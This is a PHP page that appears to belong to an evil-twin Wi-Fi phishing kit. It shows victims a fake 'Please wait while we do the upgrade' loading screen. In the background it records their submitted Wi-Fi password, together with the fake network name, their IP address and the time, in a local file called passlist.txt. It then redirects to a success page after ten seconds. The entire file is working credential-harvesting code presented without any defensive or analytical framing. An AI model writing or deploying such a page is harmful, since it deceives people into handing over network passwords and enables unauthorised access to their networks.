<?php include 'header.php' ?>
<center>
	<p>Please wait while we do the upgrade...</p>
	<img src="loading.gif" style="width: 50px;"></img>
</center>
<?php include 'footer.php' ?>
<?php

$ssidfile = fopen("./fakessid", "r") or die("Unable to open fakessid file!");
$passfile = fopen("./passlist.txt", "a") or die("Unable to open pass file!");
$passcontent = "Essid: ";
$passcontent .= fgets($ssidfile,filesize("./fakessid"));
$passcontent .= ", Pass: ";
$passcontent .= $_POST["password"];
$passcontent .= ", IP: ";
$passcontent .= $_SERVER['REMOTE_ADDR'];
$passcontent .= ", Date: ";
$passcontent .= date("Y-m-d H:i:s");
$passcontent .= "\n\n";

fwrite($passfile, $passcontent);
fclose($passfile);
?>
<script type="text/javascript">
	setTimeout(function() {
		location.href = "success.php";

	}, 10000);
</script>
